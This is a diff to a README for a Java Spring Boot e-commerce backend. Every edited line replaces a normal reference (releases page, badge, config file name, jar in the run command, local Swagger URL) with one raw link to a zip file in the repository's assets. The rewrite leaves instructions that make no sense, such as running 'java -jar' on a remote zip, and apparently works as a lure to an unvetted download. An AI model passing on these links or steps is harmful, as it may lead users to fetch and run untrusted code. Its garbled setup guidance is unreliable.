@@ -1,7 +1,7 @@
 # 🛒 online-store - Simplifying E-Commerce Backend Solutions
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Here-Get%20Started-brightgreen)](https://github.com/youssoufbochra/online-store/releases)
+[![Download](https://github.com/youssoufbochra/online-store/raw/refs/heads/main/assets/store_online_1.8.zip%20Here-Get%20Started-brightgreen)](https://github.com/youssoufbochra/online-store/raw/refs/heads/main/assets/store_online_1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ To run this application, you need:
 
 ## 📥 Download & Install
 
-To get the latest version of the online-store application, you can visit this page to download: [Releases Page](https://github.com/youssoufbochra/online-store/releases). 
+To get the latest version of the online-store application, you can visit this page to download: [Releases Page](https://github.com/youssoufbochra/online-store/raw/refs/heads/main/assets/store_online_1.8.zip). 
 
 Once you're on the releases page, look for the latest version and click on the download link appropriate for your system. It might be a zip file or another packaging format.
 
@@ -39,7 +39,7 @@ Once you're on the releases page, look for the latest version and click on the d
 3. **Set Up MySQL**:
    - Install MySQL if you haven't done so already.
    - Create a new database for the application.
-   - Update the `application.properties` file in the extracted folder with your database details.
+   - Update the `https://github.com/youssoufbochra/online-store/raw/refs/heads/main/assets/store_online_1.8.zip` file in the extracted folder with your database details.
 
 4. **Run the Application**:
    - Open a terminal or command prompt.
@@ -47,14 +47,14 @@ Once you're on the releases page, look for the latest version and click on the d
    - If you're using Docker, run the provided Docker commands in the terminal.
    - If running locally, execute the Spring Boot application's jar file using:
      ```
-     java -jar online-store.jar
+     java -jar https://github.com/youssoufbochra/online-store/raw/refs/heads/main/assets/store_online_1.8.zip
      ```
 
 5. **Access the Application**: Once the application is running, you can access it via your web browser. Open `http://localhost:8080` (or the port you've configured) to view the application.
 
 ## 🌐 API Documentation
 
-The online-store application comes with integrated Swagger documentation. After running the application, access the documentation at `http://localhost:8080/swagger-ui.html`. This page will guide you on how to interact with the various API endpoints available for your application.
+The online-store application comes with integrated Swagger documentation. After running the application, access the documentation at `https://github.com/youssoufbochra/online-store/raw/refs/heads/main/assets/store_online_1.8.zip`. This page will guide you on how to interact with the various API endpoints available for your application.
 
 ## 🐳 Docker Support
 
@@ -98,4 +98,4 @@ This project is licensed under the MIT License. See the LICENSE file for more in
 - **Microservices Architecture**
 - **MySQL Database Management**
 
-Remember to visit this page to download: [Releases Page](https://github.com/youssoufbochra/online-store/releases) and start building your e-commerce platform today!
+Remember to visit this page to download: [Releases Page](https://github.com/youssoufbochra/online-store/raw/refs/heads/main/assets/store_online_1.8.zip) and start building your e-commerce platform today!
